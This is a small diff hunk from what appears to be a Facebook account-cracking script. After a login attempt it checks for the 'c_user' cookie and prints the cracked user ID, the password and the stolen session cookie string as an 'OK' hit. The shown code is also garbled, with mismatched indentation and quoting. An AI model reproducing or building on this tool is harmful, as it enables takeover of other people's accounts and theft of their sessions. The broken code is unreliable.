@@ -886,7 +886,7 @@ class Main:
 }
 
 response = requests.get('https://free.facebook.com/', cookies=cookies, headers=headers) 
-			if 'c_user' in log_cookies:
+		if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[151:166]
 				print("\r\x1b[97;1m║ \033[38;5;46m[Toxic.N-OK][🔥]  ' +uid+ ' | ' +ps+    '  \n  \x1b[97;1m║ \033[38;5;45m[‎‎🍪]COOKIE = \033[0m'+coki+  '\n\033[0m ")
